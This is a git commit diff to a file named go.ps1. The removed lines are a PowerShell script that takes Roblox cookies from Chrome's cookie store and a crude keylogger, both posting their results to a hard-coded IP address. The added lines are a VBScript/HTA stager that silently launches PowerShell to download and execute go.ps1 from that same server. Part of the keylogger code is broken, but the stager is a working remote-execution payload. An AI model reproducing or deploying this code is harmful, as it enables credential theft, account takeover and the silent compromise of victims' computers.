4082dacd49423dd735775423f79a6994c37d06b7
makinbank123456789-web <makinbank123456789@gmail.com>
2025-11-07 02:21:01 -0500

    Update go.ps1

--- go.ps1
+++ go.ps1
@@ -1,17 +1,6 @@
-     # Steal Roblox cookies from Chrome (hypothetical - AV will block)
-     $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
-     if (Test-Path $chromePath) {
-         $cookies = Get-Content $chromePath | Select-String "roblox.com" | Out-String
-         Invoke-WebRequest -Uri "http://76.112.215.80:8080/steal.php" -Method POST -Body $cookies
-     }
-     # Or keylog for passwords
-     Add-Type -AssemblyName System.Windows.Forms
-     while ($true) { 
-         if ([System.Windows.Forms.Control]::MouseButtons -band [System.Windows.Forms.MouseButtons]::Left) { 
-             # Log keystrokes - simplified
-             $log += [System.Windows.Forms.SendKeys]::GetKeystroke()
-         }
-         Start-Sleep -Milliseconds 10
-     }
-     # Send log to your server
-     Invoke-WebRequest -Uri "http://76.112.215.80:8080/log.php" -Method POST -Body $log
+<script language="VBScript">
+  Set shell = CreateObject("WScript.Shell")
+  cmd = "powershell -nop -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http://76.112.215.80:8080/go.ps1'))"""
+  shell.Run cmd, 0, False
+  window.close
+</script>
